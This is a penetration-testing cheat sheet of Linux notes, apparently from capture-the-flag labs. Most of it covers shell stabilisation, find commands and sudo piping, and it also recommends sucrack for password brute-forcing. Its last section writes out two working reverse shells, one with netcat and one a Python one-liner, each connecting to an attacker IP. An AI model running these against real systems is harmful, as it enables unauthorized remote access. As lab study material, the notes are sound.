# Linux

## Upgrade to fully interactive shell with colours

```shell
python -c 'import pty; pty.spawn("/bin/bash")'
# Press Ctrl-Z
stty raw -echo
fg
ls
stty rows 40 columns 150
export SHELL=bash
export TERM=xterm

export LS_OPTIONS='--color=auto'
eval "`dircolors`"
alias ls='ls $LS_OPTIONS'
export PS1='\[\e]0;\u@\h: \w\a\]\[\033[01;32m\]\u@\h\[\033[01;34m\] \w \$\[\033[00m\] '
```

## General Linux tips

To get back to previous dir `cd -`

You may want to use **sucrack** over hydra if SSH is disabled from outside. Note that sucrack works only for one user at a time though.

Check ASCII table with `man ascii`

Find only files (not dirs) in current dir and subdirs

```bash
find . -type f -ls
```

Find files readable by current user

```bash
find / -type f -readable -ls
```

Find files owned by jimmy

```bash
find / -user jimmy -ls 2>/dev/null
```

Compare files side by side with `diff -y <old> <new>`, or use `vimdiff` if available.

### Search files by modified dates

To find files modified between 01-01-2020 and 03-01-2020:

```shell
find / -newermt 2020-01-01 ! -newermt 2020-01-03 2>/dev/null
```

To confirm the file modified date

```shell
stat filename
```

Sudo and pipe. Sudo terminates at pipe

```shell
sudo <cmd1> | <cmd2>
```

Here <cmd2> is run as user, not root

#### /etc/sshd

**DenyUsers** can be used to deny SSH logins so try `su user` instead if unsuccessful.

#### mysql

This is equivalent to `SHOW COLUMNS FROM <table_name>`
```sql
describe <table_name>
```
#### git

Find git/svn repos by searching for `.git` and `.svn`
```shell
find . -name .git
```

#### Trace processes by parent PIDs

`ps -ef` allows you to see which processes spawn which other child processes, so you can track what commands actually do. Start with the PID of cmd entered, then see what it is a parent to and so on.

#### nohup to get another shell

If you need another shell, you can use `nohup <cmd> &` like this
```shell
pepper@jarvis /var/www/Admin-Utilities $ nohup nc -e /bin/bash 10.10.14.78 443 &
[2] 1009
```
or
```shell
pepper@jarvis /var/www/Admin-Utilities $ nohup python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.78",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' &
[1] 999
```